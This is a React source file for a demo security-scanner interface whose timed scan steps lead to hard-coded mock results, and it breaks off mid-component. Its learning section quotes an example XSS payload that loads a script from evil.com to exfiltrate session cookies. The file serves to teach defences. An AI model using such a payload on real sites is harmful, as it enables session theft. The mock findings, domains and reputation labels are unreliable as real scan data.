import React, { useState, useEffect } from "react";
import {
  RadarChart, PolarGrid, PolarAngleAxis, Radar,
  ResponsiveContainer, PieChart, Pie, Cell, BarChart, Bar, XAxis, Tooltip,
} from "recharts";
import {
  Shield, Lock, Globe, Server, Code, FileText, AlertTriangle,
  CheckCircle, XCircle, ChevronDown, ChevronRight, Menu,
  Search, Database, Info, BookOpen, Home, RefreshCw, Zap, Activity,
  Eye, EyeOff, Link2, Key, Fingerprint,
} from "lucide-react";

/* ─── TYPES ──────────────────────────────────────────────────────────────── */
type Phase = "hero" | "scanning" | "results";
type Tool = "website" | "password" | "url";
type Section = "overview" | "ssl" | "dns" | "headers" | "cookies" | "tech" | "findings" | "learning";
type PasswordSection = "overview" | "strength" | "entropy" | "patterns" | "exposure" | "tips";
type URLSection = "overview" | "domain" | "ssl" | "keywords" | "redirects" | "findings";
type Severity = "warning" | "passed" | "info";
type CardStatus = "pass" | "warn" | "fail" | "info";
type ScanStep = { label: string; duration: number };

/* ─── SCAN STEPS ─────────────────────────────────────────────────────────── */
const SCAN_STEPS = [
  { label: "Initializing ThreatLens Engine",  duration: 480  },
  { label: "Resolving Domain",                duration: 560  },
  { label: "Fetching SSL Certificate",        duration: 820  },
  { label: "Analyzing Security Headers",      duration: 680  },
  { label: "Inspecting Cookies",              duration: 480  },
  { label: "Collecting DNS Intelligence",     duration: 920  },
  { label: "Fingerprinting Technologies",     duration: 1100 },
  { label: "Analyzing HTTP Methods",          duration: 380  },
  { label: "Parsing robots.txt",              duration: 280  },
  { label: "Calculating Risk Score",          duration: 780  },
];

const PASSWORD_SCAN_STEPS: ScanStep[] = [
  { label: "Initializing Password Engine",         duration: 420 },
  { label: "Checking password entropy",            duration: 560 },
  { label: "Checking dictionary words",            duration: 700 },
  { label: "Checking leaked password patterns",    duration: 900 },
  { label: "Checking keyboard sequences",          duration: 480 },
  { label: "Checking repeated characters",         duration: 400 },
  { label: "Generating security recommendations",  duration: 640 },
];

const URL_SCAN_STEPS: ScanStep[] = [
  { label: "Initializing Phishing Engine",         duration: 400 },
  { label: "Checking domain",                      duration: 580 },
  { label: "Checking redirects",                   duration: 720 },
  { label: "Checking SSL certificate",             duration: 660 },
  { label: "Checking suspicious keywords",         duration: 520 },
  { label: "Checking TLD reputation",              duration: 440 },
  { label: "Checking homograph attacks",           duration: 600 },
  { label: "Checking URL length & structure",      duration: 320 },
  { label: "Generating phishing score",            duration: 700 },
];

const TOOL_TABS: { id: Tool; emoji: string; label: string }[] = [
  { id: "website",  emoji: "🌐", label: "Website Scanner"   },
  { id: "password", emoji: "🔒", label: "Password Analyzer" },
  { id: "url",      emoji: "🎣", label: "URL Analyzer"      },
];

/* ─── SIDEBAR NAV ────────────────────────────────────────────────────────── */
const NAV = [
  { id: "overview" as Section,  label: "Overview",    Icon: Home          },
  { id: "ssl"      as Section,  label: "SSL / TLS",   Icon: Lock          },
  { id: "dns"      as Section,  label: "DNS",         Icon: Globe         },
  { id: "headers"  as Section,  label: "Headers",     Icon: Shield        },
  { id: "cookies"  as Section,  label: "Cookies",     Icon: Database      },
  { id: "tech"     as Section,  label: "Technology",  Icon: Code          },
  { id: "findings" as Section,  label: "Findings",    Icon: AlertTriangle },
  { id: "learning" as Section,  label: "Learning",    Icon: BookOpen      },
];

/* ─── BACKGROUND NODES (deterministic) ──────────────────────────────────── */
const NODES = Array.from({ length: 24 }, (_, i) => ({
  x: ((i * 41 + 13) % 94) + 3,
  y: ((i * 37 + 7)  % 88) + 6,
  dur: 8 + (i % 5) * 2,
  del: (i * 0.73) % 5,
  color: i % 3 === 0 ? "#06b6d4" : i % 3 === 1 ? "#3b82f6" : "#10b981",
}));

const EDGES: { x1: number; y1: number; x2: number; y2: number }[] = (() => {
  const out: { x1: number; y1: number; x2: number; y2: number }[] = [];
  for (let i = 0; i < NODES.length; i++) {
    for (let j = i + 1; j < NODES.length; j++) {
      const dx = NODES[i].x - NODES[j].x;
      const dy = NODES[i].y - NODES[j].y;
      if (Math.sqrt(dx * dx + dy * dy) < 20) {
        out.push({ x1: NODES[i].x, y1: NODES[i].y, x2: NODES[j].x, y2: NODES[j].y });
      }
    }
  }
  return out;
})();

/* ─── MOCK DATA ──────────────────────────────────────────────────────────── */
const D = {
  score: 87,
  grade: "A+",
  risk: "Low Risk",
  confidence: "High Confidence",

  ssl: {
    grade: "A+", valid: true,
    issuer: "DigiCert Global G2 TLS RSA SHA256 2020 CA1",
    subject: "*.github.com",
    serial: "08:3B:E0:56:90:42:46:B1:A1:75:6A:C9:59:91:C7:4A",
    expires: "Sep 30, 2025",
    daysLeft: 271,
    protocol: "TLS 1.3",
    cipher: "TLS_AES_256_GCM_SHA384",
    bits: 256,
    transparency: true,
    ocsp: "OCSP Stapling Active",
    hsts: true,
  },

  dns: [
    { type: "A",    value: "192.30.255.113",                     ttl: "60s"     },
    { type: "A",    value: "192.30.255.112",                     ttl: "60s"     },
    { type: "AAAA", value: "2606:50c0:8000::153",                ttl: "60s"     },
    { type: "MX",   value: "10 aspmx.l.google.com",             ttl: "3600s"   },
    { type: "TXT",  value: "v=spf1 include:_spf.google.com ~all",ttl: "3600s"  },
    { type: "NS",   value: "ns-1707.awsdns-21.co.uk",           ttl: "172800s" },
    { type: "CAA",  value: "0 issue \"digicert.com\"",          ttl: "3600s"   },
  ],

  headers: [
    { name: "Strict-Transport-Security",   present: true,  value: "max-age=31536000; includeSubDomains; preload" },
    { name: "Content-Security-Policy",     present: true,  value: "default-src 'self'; script-src 'self'" },
    { name: "X-Frame-Options",             present: false, value: null },
    { name: "X-Content-Type-Options",      present: true,  value: "nosniff" },
    { name: "Referrer-Policy",             present: true,  value: "strict-origin-when-cross-origin" },
    { name: "Permissions-Policy",          present: false, value: null },
    { name: "X-XSS-Protection",            present: true,  value: "1; mode=block" },
    { name: "Cross-Origin-Opener-Policy",  present: true,  value: "same-origin" },
  ],

  cookies: [
    { name: "_gh_sess",     secure: true,  httpOnly: true,  sameSite: "Lax",  path: "/" },
    { name: "user_session", secure: true,  httpOnly: true,  sameSite: null,   path: "/" },
    { name: "_octo",        secure: true,  httpOnly: false, sameSite: "Lax",  path: "/" },
  ],

  technologies: [
    { name: "React",          category: "Frontend",  risk: "low"  },
    { name: "Ruby on Rails",  category: "Backend",   risk: "low"  },
    { name: "Nginx",          category: "Server",    risk: "low"  },
    { name: "Cloudflare",     category: "CDN / WAF", risk: "low"  },
    { name: "GitHub Actions", category: "CI / CD",   risk: "low"  },
    { name: "MySQL",          category: "Database",  risk: "low"  },
    { name: "Redis",          category: "Cache",     risk: "low"  },
    { name: "Bootstrap",      category: "CSS",       risk: "low"  },
    { name: "Go",             category: "Backend",   risk: "low"  },
    { name: "AWS S3",         category: "Storage",   risk: "low"  },
  ],

  findings: [
    { severity: "warning" as Severity, title: "X-Frame-Options Header Missing",    desc: "The X-Frame-Options header is absent, leaving the site exposed to clickjacking attacks where attackers embed the page in a transparent iframe over a decoy site." },
    { severity: "warning" as Severity, title: "Cookie Missing SameSite Attribute", desc: "The user_session cookie lacks a SameSite attribute, increasing the CSRF attack surface when users visit third-party websites." },
    { severity: "warning" as Severity, title: "Permissions-Policy Header Absent",  desc: "Without a Permissions-Policy header, browsers may grant unrestricted access to powerful features like camera, microphone, and geolocation to third-party scripts." },
    { severity: "passed"  as Severity, title: "HTTPS Enforced Globally",           desc: "All HTTP traffic is automatically redirected to HTTPS with HSTS preloading enabled, preventing protocol downgrade attacks." },
    { severity: "passed"  as Severity, title: "TLS 1.3 Protocol in Use",          desc: "Modern cipher suites with perfect forward secrecy via AES-256-GCM and automatic key rotation — no deprecated TLS 1.0/1.1 fallbacks." },
    { severity: "passed"  as Severity, title: "DNSSEC Validation Active",         desc: "DNS records are cryptographically signed and validated, blocking DNS spoofing and cache poisoning attacks." },
    { severity: "passed"  as Severity, title: "Content Security Policy Present",   desc: "A CSP header restricts which resources can be loaded, significantly reducing the risk of cross-site scripting attacks." },
    { severity: "passed"  as Severity, title: "robots.txt Properly Configured",   desc: "Crawl rules are present and correctly structured, preventing sensitive paths from being indexed by search engines." },
    { severity: "info"    as Severity, title: "security.txt Not Found",            desc: "A /.well-known/security.txt file provides a responsible disclosure channel for security researchers to report vulnerabilities." },
  ],

  radar: [
    { subject: "SSL/TLS",    value: 95 },
    { subject: "DNS",        value: 78 },
    { subject: "Headers",    value: 72 },
    { subject: "Cookies",    value: 68 },
    { subject: "Stack",      value: 85 },
    { subject: "Disclosure", value: 55 },
  ],

  donut: [
    { name: "Passed",   value: 5, color: "#10b981" },
    { name: "Warnings", value: 3, color: "#f59e0b" },
    { name: "Info",     value: 1, color: "#3b82f6" },
  ],

  modules: [
    { id: "ssl"      as Section, label: "SSL Certificate",  Icon: Lock,         status: "pass" as CardStatus, metric: "TLS 1.3 · Grade A+",  score: 95 },
    { id: "dns"      as Section, label: "DNS Security",     Icon: Globe,        status: "pass" as CardStatus, metric: "7 records · DNSSEC",   score: 78 },
    { id: "headers"  as Section, label: "Security Headers", Icon: Shield,       status: "warn" as CardStatus, metric: "6 / 8 present",        score: 72 },
    { id: "cookies"  as Section, label: "Cookie Security",  Icon: Database,     status: "warn" as CardStatus, metric: "3 cookies · 1 issue",  score: 68 },
    { id: "tech"     as Section, label: "Technology Stack", Icon: Code,         status: "pass" as CardStatus, metric: "10 detected",          score: 85 },
    { id: "findings" as Section, label: "HTTP Methods",     Icon: Server,       status: "pass" as CardStatus, metric: "GET · POST only",      score: 90 },
    { id: "findings" as Section, label: "robots.txt",       Icon: FileText,     status: "pass" as CardStatus, metric: "Present · Configured", score: 100 },
    { id: "findings" as Section, label: "security.txt",     Icon: Eye,          status: "info" as CardStatus, metric: "Not found",            score: 40  },
  ],

  learning: [
    {
      title: "Content Security Policy (CSP)",
      severity: "high",
      what: "CSP is an HTTP response header that restricts which resources the browser can load — scripts, styles, fonts, and media.",
      why: "Without CSP, a single XSS flaw lets attackers inject and execute arbitrary scripts, stealing session tokens and sensitive user data.",
      example: "An attacker exploits an XSS vulnerability in a comment field and injects <script src='https://evil.com/steal.js'></script> to exfiltrate session cookies to a remote server.",
      prevention: "Add Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' to restrict untrusted script execution.",
    },
    {
      title: "Clickjacking via X-Frame-Options",
      severity: "medium",
      what: "X-Frame-Options prevents your site from being embedded in iframes by third-party domains, protecting against UI redressing attacks.",
      why: "Attackers overlay a transparent iframe of your site on a decoy page, tricking users into clicking hidden buttons like 'Transfer Funds'.",
      example: "A malicious gaming site places your bank's 'Confirm Transfer' button beneath an invisible iframe, making users unknowingly authorize transactions.",
      prevention: "Add X-Frame-Options: DENY to all responses, or use Content-Security-Policy: frame-ancestors 'none' for fine-grained control.",
    },
    {
      title: "CSRF via SameSite Cookie Attribute",
      severity: "medium",
      what: "SameSite controls whether cookies are sent with cross-origin requests — your primary defense against Cross-Site Request Forgery.",
      why: "Without SameSite, attacker-controlled sites can make authenticated requests to your app using the victim's session cookies.",
      example: "Visiting evil.com triggers a hidden POST to your banking app. Since cookies are attached, the server sees a valid authenticated request and executes the transfer.",
      prevention: "Set SameSite=Strict on all session cookies. Combine with server-side CSRF tokens for defense-in-depth on sensitive operations.",
    },
  ],
};

/* ─── PASSWORD & URL NAV ─────────────────────────────────────────────────── */
const PASSWORD_NAV: { id: PasswordSection; label: string; Icon: React.ElementType }[] = [
  { id: "overview",  label: "Overview",    Icon: Home          },
  { id: "strength",  label: "Strength",    Icon: Zap           },
  { id: "entropy",   label: "Entropy",     Icon: Activity      },
  { id: "patterns",  label: "Patterns",    Icon: Eye           },
  { id: "exposure",  label: "Exposure",    Icon: AlertTriangle },
  { id: "tips",      label: "Tips",        Icon: BookOpen      },
];

const URL_NAV: { id: URLSection; label: string; Icon: React.ElementType }[] = [
  { id: "overview",  label: "Overview",    Icon: Home          },
  { id: "domain",    label: "Domain",      Icon: Globe         },
  { id: "ssl",       label: "SSL",         Icon: Lock          },
  { id: "keywords",  label: "Keywords",    Icon: Search        },
  { id: "redirects", label: "Redirects",   Icon: Activity      },
  { id: "findings",  label: "Findings",    Icon: AlertTriangle },
];

/* ─── PASSWORD UTILITY ───────────────────────────────────────────────────── */
function pwStrength(pw: string): { pct: number; label: string; color: string } {
  if (!pw) return { pct: 0, label: "", color: "#06b6d4" };
  let s = 0;
  if (pw.length >= 8)  s++;
  if (pw.length >= 12) s++;
  if (pw.length >= 16) s++;
  if (/[A-Z]/.test(pw)) s++;
  if (/[a-z]/.test(pw)) s++;
  if (/[0-9]/.test(pw)) s++;
  if (/[^A-Za-z0-9]/.test(pw)) s++;
  const pct = Math.round((s / 7) * 100);
  if (s <= 2) return { pct, label: "Weak",        color: "#ef4444" };
  if (s <= 4) return { pct, label: "Fair",        color: "#f59e0b" };
  if (s <= 5) return { pct, label: "Strong",      color: "#06b6d4" };
  return           { pct, label: "Very Strong",   color: "#10b981" };
}

/* ─── MOCK DATA: PASSWORD ────────────────────────────────────────────────── */
const PD = {
  score: 52, grade: "C", strength: "Moderate",
  entropy: 38.4, crackTime: "~6 hours", charTypes: 3,

  radar: [
    { subject: "Entropy",       value: 55 },
    { subject: "Length",        value: 65 },
    { subject: "Complexity",    value: 50 },
    { subject: "Uniqueness",    value: 42 },
    { subject: "Dict. Resist.", value: 48 },
  ],
  donut: [
    { name: "Strong Features", value: 3, color: "#10b981" },
    { name: "Weaknesses",      value: 5, color: "#f59e0b" },
    { name: "Recommendations", value: 3, color: "#3b82f6" },
  ],
  modules: [
    { label: "Strength Grade",       status: "warn" as CardStatus, metric: "Moderate · C",      score: 52  },
    { label: "Entropy",              status: "warn" as CardStatus, metric: "38.4 bits",          score: 55  },
    { label: "Crack Time",           status: "warn" as CardStatus, metric: "~6 hours",           score: 40  },
    { label: "Character Diversity",  status: "warn" as CardStatus, metric: "3 / 4 char types",   score: 65  },
    { label: "Dictionary Match",     status: "fail" as CardStatus, metric: "Partial match",      score: 25  },
    { label: "Keyboard Patterns",    status: "pass" as CardStatus, metric: "None detected",      score: 90  },
    { label: "Repeated Characters",  status: "pass" as CardStatus, metric: "None detected",      score: 88  },
    { label: "Sequential Chars",     status: "warn" as CardStatus, metric: "2 sequences",        score: 50  },
    { label: "Leaked Password",      status: "fail" as CardStatus, metric: "Pattern match",      score: 20  },
    { label: "Recommendations",      status: "info" as CardStatus, metric: "5 suggestions",      score: 50  },
  ],
  findings: [
    { severity: "warning" as Severity, title: "Low Entropy (38.4 bits)",              desc: "The password entropy is below the recommended 60+ bits. Modern brute-force hardware can crack this significantly faster than ideal." },
    { severity: "warning" as Severity, title: "Dictionary Pattern Match",             desc: "The password contains a recognizable word pattern found in common password dictionaries used by automated cracking tools." },
    { severity: "warning" as Severity, title: "Sequential Characters Found",          desc: "Contains 2 sequential character sequences that predictably reduce the search space for dictionary and hybrid attacks." },
    { severity: "warning" as Severity, title: "Crack Time: ~6 Hours",                desc: "GPU-based rigs using hashcat can crack this password in approximately 6 hours on MD5, faster on weaker hashing algorithms." },
    { severity: "warning" as Severity, title: "Pattern Matches Breached Database",   desc: "This password structure matches patterns found in well-known data breach compilations (RockYou, Collections #1–5)." },
    { severity: "passed"  as Severity, title: "Uppercase Letters Present",            desc: "Password contains uppercase characters, contributing positively to overall complexity and entropy." },
    { severity: "passed"  as Severity, title: "Numeric Digits Used",                 desc: "Password includes numeric digits, increasing the character set size and improving resistance to simple attacks." },
    { severity: "passed"  as Severity, title: "No Keyboard Walk Patterns",           desc: "No sequential keyboard walk patterns (qwerty, asdf, zxcv) detected. These are the first patterns crackers test." },
    { severity: "info"    as Severity, title: "Tip: Target 16+ Characters",          desc: "Increasing length to 16+ characters is the single highest-impact change. Each additional character multiplies crack time exponentially." },
  ],
  criteria: [
    { label: "At least 8 characters",       met: true  },
    { label: "At least 12 characters",      met: true  },
    { label: "At least 16 characters",      met: false },
    { label: "Uppercase letters (A–Z)",     met: true  },
    { label: "Lowercase letters (a–z)",     met: true  },
    { label: "Numbers (0–9)",               met: true  },
    { label: "Special characters (!@#$…)",  met: false },
    { label: "Not a dictionary word",       met: false },
    { label: "Not in breach databases",     met: false },
  ],
};

/* ─── MOCK DATA: URL ─────────────────────────────────────────────────────── */
const UD = {
  score: 24, threatScore: 76, grade: "F", riskLevel: "High Risk",

  radar: [
    { subject: "Domain Trust",     value: 18 },
    { subject: "SSL",              value: 85 },
    { subject: "URL Structure",    value: 22 },
    { subject: "Content Safety",   value: 40 },
    { subject: "Redirect Safety",  value: 35 },
    { subject: "Reputation",       value: 12 },
  ],
  donut: [
    { name: "Safe Indicators", value: 2, color: "#10b981" },
    { name: "Suspicious",      value: 5, color: "#f59e0b" },
    { name: "Dangerous",       value: 5, color: "#ef4444" },
  ],
  modules: [
    { label: "Overall Threat",       status: "fail" as CardStatus, metric: "76% — High Risk",     score: 24 },
    { label: "Risk Level",           status: "fail" as CardStatus, metric: "High Risk",            score: 20 },
    { label: "SSL Certificate",      status: "pass" as CardStatus, metric: "Valid · TLS 1.3",      score: 90 },
    { label: "Domain Age",           status: "fail" as CardStatus, metric: "Registered 2 days ago",score: 12 },
    { label: "Redirect Count",       status: "warn" as CardStatus, metric: "4 redirects",          score: 38 },
    { label: "Suspicious Keywords",  status: "fail" as CardStatus, metric: "6 detected",           score: 18 },
    { label: "URL Length",           status: "warn" as CardStatus, metric: "127 characters",        score: 32 },
    { label: "IP Address in URL",    status: "fail" as CardStatus, metric: "Raw IP detected",      score: 10 },
    { label: "Homograph Detection",  status: "warn" as CardStatus, metric: "Possible IDN abuse",   score: 25 },
    { label: "WHOIS Privacy",        status: "warn" as CardStatus, metric: "Registrant hidden",    score: 30 },
    { label: "Registrar Risk",       status: "warn" as CardStatus, metric: "High-risk registrar",  score: 28 },
    { label: "Final Verdict",        status: "fail" as CardStatus, metric: "⚠ Do Not Visit",       score: 10 },
  ],
  findings: [
    { severity: "warning" as Severity, title: "Domain Registered 2 Days Ago",      desc: "Newly registered domains are a major phishing indicator. Legitimate services rarely host production content within days of registration." },
    { severity: "warning" as Severity, title: "Raw IP Address in URL",              desc: "Using a raw IP address instead of a domain name bypasses DNS-based reputation checks and is a strong phishing signal." },
    { severity: "warning" as Severity, title: "6 Suspicious Keywords Detected",     desc: "Keywords like 'secure', 'login', 'verify', 'account', 'update', and 'confirm' are used to create urgency in phishing pages." },
    { severity: "warning" as Severity, title: "URL Length: 127 Characters",         desc: "Excessively long URLs obscure the true destination and are used in phishing kits to hide the real domain from casual inspection." },
    { severity: "warning" as Severity, title: "4 Redirect Chains Detected",         desc: "Multiple redirects obscure the final destination and are frequently used in phishing kits to evade detection systems." },
    { severity: "warning" as Severity, title: "Possible Homograph Attack",          desc: "The domain may use visually similar Unicode characters (e.g., Cyrillic 'а' instead of Latin 'a') to impersonate trusted brands." },
    { severity: "warning" as Severity, title: "WHOIS Privacy Enabled",              desc: "The registrant identity is hidden via a WHOIS privacy service, preventing accountability and making takedown harder." },
    { severity: "warning" as Severity, title: "High-Risk Registrar",                desc: "This domain was registered through a registrar frequently associated with disposable phishing and scam domains." },
    { severity: "passed"  as Severity, title: "SSL Certificate Valid",              desc: "The site has a valid TLS certificate. HTTPS alone does not indicate safety — phishing sites commonly obtain free SSL certificates." },
    { severity: "info"    as Severity, title: "Recommendation: Do Not Proceed",    desc: "Combined risk factors indicate strong phishing activity. Do not enter credentials, personal data, or payment information on this site." },
  ],
  keywords: ["secure", "login", "verify", "account-update", "confirm", "payment-now"],
  redirects: [
    { hop: 1, url: "http://susp1c10us-login.xyz/go",             code: 301 },
    { hop: 2, url: "https://trackme.click/r?id=993",             code: 302 },
    { hop: 3, url: "https://192.168.1.1/phish/bank-login",       code: 302 },
    { hop: 4, url: "https://fake-secure-banklogin.xyz/index",    code: 200 },
  ],
  domain: {
    age: "2 days",
    registrar: "NameCheap (High-Risk Pattern)",
    whois: "Privacy Protected",
    ip: "185.220.101.47",
    country: "RU",
    asn: "AS44477 — STARK INDUSTRIES",
    tld: ".xyz (High-risk TLD)",
  },
};

/* ─── CSS ────────────────────────────────────────────────────────────────── */
const STYLES = `
  @keyframes tl-float {
    0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.4; }
    33%       { transform: translateY(-14px) translateX(8px); opacity: 0.7; }
    66%       { transform: translateY(8px) translateX(-5px); opacity: 0.5; }
  }
  @keyframes tl-node-pulse {
    0%, 100% { opacity: 0.25; }
    50%       { opacity: 0.9; }
  }
  @keyframes tl-slide-up {
    from { opacity: 0; transform: translateY(20px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes tl-fade-in {
    from { opacity: 0; }
    to   { opacity: 1; }
  }
  @keyframes tl-scan-blink {
    0%, 100% { opacity: 1; }
    50%       { opacity: 0; }
  }
  @keyframes tl-grid-breathe {
    0%, 100% { opacity: 0.5; }
    50%       { opacity: 0.85; }
  }
  @keyframes tl-score-pulse {
    0%, 70% { filter: none; }
    85%      { filter: drop-shadow(0 0 18px rgba(16,185,129,0.9)); }
    100%     { filter: drop-shadow(0 0 6px rgba(16,185,129,0.4)); }
  }
  @keyframes tl-warn-glow {
    0%, 100% { box-shadow: none; }
    50%       { box-shadow: 0 0 0 3px rgba(245,158,11,0.15); }
  }
  @keyframes tl-scanline {
    0%   { top: -4px; }
    100% { top: 100%; }
  }

  .tl-glass {
    background: rgba(10, 20, 45, 0.55);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid rgba(6, 182, 212, 0.12);
    border-radius: 16px;
    transition: border-color 0.2s ease, background 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
  }
  .tl-glass:hover {
    border-color: rgba(6, 182, 212, 0.26);
    background: rgba(10, 25, 55, 0.65);
    transform: translateY(-2px);
    box-shadow: 0 8px 32px rgba(6, 182, 212, 0.07);
  }
  .tl-glass-static {
    background: rgba(10, 20, 45, 0.55);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid rgba(6, 182, 212, 0.12);
    border-radius: 16px;
  }
  .tl-glow-btn {
    transition: box-shadow 0.2s ease, transform 0.15s ease, background 0.2s ease;
  }
  .tl-glow-btn:hover {
    box-shadow: 0 0 28px rgba(6,182,212,0.5), 0 0 56px rgba(6,182,212,0.18), inset 0 0 16px rgba(6,182,212,0.08);
    transform: scale(1.02);
  }
  .tl-glow-btn:active { transform: scale(0.98); }

  .tl-nav-item {
    border-left: 2px solid transparent;
    transition: all 0.15s ease;
    cursor: pointer;
  }
  .tl-nav-item:hover {
    background: rgba(6,182,212,0.06);
    border-left-color: rgba(6,182,212,0.3);
    color: #94a3b8;
  }
  .tl-nav-active {
    background: linear-gradient(90deg, rgba(6,182,212,0.14) 0%, transparent 100%);
    border-left: 2px solid #06b6d4 !important;
    color: #06b6d4 !important;
  }

  .tl-search {
    background: rgba(10, 20, 45, 0.65);
    border: 1px solid rgba(6, 182, 212, 0.18);
    border-radius: 12px;
    color: #e2e8f0;
    outline: none;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
    font-family: 'JetBrains Mono', monospace;
  }
  .tl-search:focus {
    border-color: rgba(6, 182, 212, 0.55);
    box-shadow: 0 0 0 3px rgba(6,182,212,0.1), 0 0 22px rgba(6,182,212,0.12);
  }
  .tl-search::placeholder { color: #334155; }

  .tl-pill {
    display: inline-flex; align-items: center;
    padding: 4px 12px; border-radius: 999px;
    font-size: 12px; font-weight: 500;
    font-family: 'JetBrains Mono', monospace;
    transition: transform 0.15s ease, box-shadow 0.15s ease;
  }
  .tl-pill:hover { transform: scale(1.06); }

  .tl-table-row:hover { background: rgba(6,182,212,0.035); }
  .tl-table-row { transition: background 0.15s ease; }

  .tl-card-enter { animation: tl-slide-up 0.45s ease forwards; opacity: 0; }
  .tl-fade-enter  { animation: tl-fade-in  0.35s ease forwards; opacity: 0; }

  .tl-warn-badge { animation: tl-warn-glow 2s ease-in-out infinite; }

  ::-webkit-scrollbar { width: 4px; height: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: rgba(6,182,212,0.18); border-radius: 2px; }
  * { box-sizing: border-box; }
`;

/* ─── HERO PAGE ──────────────────────────────────────────────────────────── */
function HeroPage({ tool, onToolChange, onAnalyze }: {
  tool: Tool;
  onToolChange: (t: Tool) => void;
  onAnalyze: (t: string) => void;
}) {
  const [input,    setInput]    = useState("");
  const [showPass, setShowPass] = useState(false);

  const handleToolChange = (t: Tool) => { onToolChange(t); setInput(""); };

  const TOOL_META = {
    website:  { placeholder: "github.com", examples: ["github.com", "stripe.com", "cloudflare.com"], btnLabel: "Analyze Website",  btnIcon: Zap,         features: [{ Icon: Lock, label: "SSL / TLS" }, { Icon: Shield, label: "Headers" }, { Icon: Globe, label: "DNS" }, { Icon: Activity, label: "Risk Score" }] },
    password: { placeholder: "Enter your password", examples: ["P@ssw0rd!", "hunter2", "correct-horse-battery"], btnLabel: "Analyze Password", btnIcon: Key,          features: [{ Icon: Key, label: "Entropy Check" }, { Icon: Fingerprint, label: "Pattern Detection" }, { Icon: Database, label: "Breach Lookup" }, { Icon: Shield, label: "Strength Score" }] },
    url:      { placeholder: "https://suspicious-example.xyz/login", examples: ["https://bit.ly/3xMfake", "http://paypa1.com/verify"], btnLabel: "Analyze URL",      btnIcon: Link2,       features: [{ Icon: Globe, label: "Domain Trust" }, { Icon: AlertTriangle, label: "Phishing Detection" }, { Icon: Activity, label: "Redirect Check" }, { Icon: Lock, label: "SSL Verify" }] },
  };

  const meta = TOOL_META[tool];
  const strength = tool === "password" ? pwStrength(input) : null;

  const go = () => {
    const fallbacks = { website: "github.com", password: "P@ssw0rd!", url: "https://suspicious-phish.xyz/login" };
    onAnalyze(input.trim() || fallbacks[tool]);
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      {/* Animated background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute inset-0" style={{
          backgroundImage: "linear-gradient(rgba(6,182,212,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(6,182,212,0.04) 1px, transparent 1px)",
          backgroundSize: "80px 80px", animation: "tl-grid-breathe 9s ease-in-out infinite",
        }} />
        <div className="absolute" style={{ top: "12%", left: "18%", width: "520px", height: "520px", background: "radial-gradient(circle, rgba(6,182,212,0.07) 0%, transparent 70%)", filter: "blur(70px)", animation: "tl-float 14s ease-in-out infinite" }} />
        <div className="absolute" style={{ bottom: "14%", right: "12%", width: "640px", height: "640px", background: "radial-gradient(circle, rgba(59,130,246,0.06) 0%, transparent 70%)", filter: "blur(80px)", animation: "tl-float 18s 5s ease-in-out infinite" }} />
        <div className="absolute" style={{ top: "48%", right: "28%", width: "360px", height: "360px", background: "radial-gradient(circle, rgba(16,185,129,0.05) 0%, transparent 70%)", filter: "blur(60px)", animation: "tl-float 11s 9s ease-in-out infinite" }} />
        <svg className="absolute inset-0 w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none" style={{ opacity: 0.38 }}>
          {EDGES.map((e, i) => <line key={i} x1={e.x1} y1={e.y1} x2={e.x2} y2={e.y2} stroke="rgba(6,182,212,0.45)" strokeWidth="0.12" />)}
          {NODES.map((n, i) => <circle key={i} cx={n.x} cy={n.y} r="0.55" fill={n.color} style={{ animation: `tl-node-pulse ${n.dur}s ${n.del}s ease-in-out infinite` }} />)}
        </svg>
        {NODES.map((n, i) => (
          <div key={`p${i}`} className="absolute rounded-full" style={{ left: `${(n.x + 5.3) % 98}%`, top: `${(n.y + 8.7) % 96}%`, width: i % 5 === 0 ? "3px" : "2px", height: i % 5 === 0 ? "3px" : "2px", background: n.color, opacity: 0.45, animation: `tl-float ${n.dur + 2}s ${n.del + 1.2}s ease-in-out infinite` }} />
        ))}
      </div>

      {/* Content */}
      <div className="relative z-10 flex flex-col items-center text-center px-6 w-full max-w-2xl" style={{ animation: "tl-fade-in 0.9s ease forwards" }}>
        {/* Logo */}
        <div className="flex items-center gap-3 mb-8">
          <div className="relative">
            <div className="w-11 h-11 rounded-xl flex items-center justify-center" style={{ background: "linear-gradient(135deg, rgba(6,182,212,0.18), rgba(59,130,246,0.18))", border: "1px solid rgba(6,182,212,0.28)" }}>
              <Shield size={22} style={{ color: "#06b6d4" }} />
            </div>
            <div className="absolute inset-0 rounded-xl" style={{ background: "rgba(6,182,212,0.12)", filter: "blur(10px)", animation: "tl-node-pulse 3s ease-in-out infinite" }} />
          </div>
          <div className="text-left">
            <div className="font-extrabold text-lg tracking-tight" style={{ color: "#e2e8f0", letterSpacing: "-0.3px" }}>ThreatLens</div>
            <div className="text-xs" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace", letterSpacing: "2px" }}>SECURITY SUITE</div>
          </div>
        </div>

        {/* ── TOOL TABS ── */}
        <div className="flex items-center gap-1 p-1 mb-8 rounded-2xl" style={{ background: "rgba(10,20,45,0.7)", border: "1px solid rgba(6,182,212,0.14)", backdropFilter: "blur(20px)" }}>
          {TOOL_TABS.map(({ id, emoji, label }) => {
            const active = tool === id;
            return (
              <button key={id} onClick={() => handleToolChange(id)} style={{
                display: "flex", alignItems: "center", gap: "8px", padding: "10px 20px", borderRadius: "14px",
                fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "'Plus Jakarta Sans', sans-serif",
                color: active ? "#e2e8f0" : "#475569",
                background: active ? "linear-gradient(135deg, rgba(6,182,212,0.18), rgba(59,130,246,0.14))" : "transparent",
                border: active ? "1px solid rgba(6,182,212,0.28)" : "1px solid transparent",
                boxShadow: active ? "0 0 20px rgba(6,182,212,0.18), inset 0 0 12px rgba(6,182,212,0.06)" : "none",
